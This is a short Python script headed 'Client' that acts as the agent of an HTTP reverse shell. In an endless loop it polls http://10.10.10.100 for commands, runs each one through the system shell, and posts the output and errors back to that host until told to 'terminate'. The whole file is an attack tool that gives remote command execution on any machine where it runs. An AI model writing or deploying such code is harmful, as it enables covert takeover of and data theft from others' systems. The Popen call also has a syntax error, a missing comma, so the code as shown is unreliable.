
#Client

import requests     #Library to be installed and imported
import subprocess 
import time


while True: 

    req = requests.get('http://10.10.10.100')      # Send GET request to host machine
    command = req.text                             # Store the received txt into command variable
        
    if 'terminate' in command:
        break 

    else:
        CMD =  subprocess.Popen(command,stdout=subprocess.PIPE,stdin=subprocess.PIPE stderr=subprocess.PIPE,shell=True,)
        post_response = requests.post(url='http://10.10.10.100', data=CMD.stdout.read() )  
        post_response = requests.post(url='http://10.10.10.100', data=CMD.stderr.read() )  

    time.sleep(3)
    


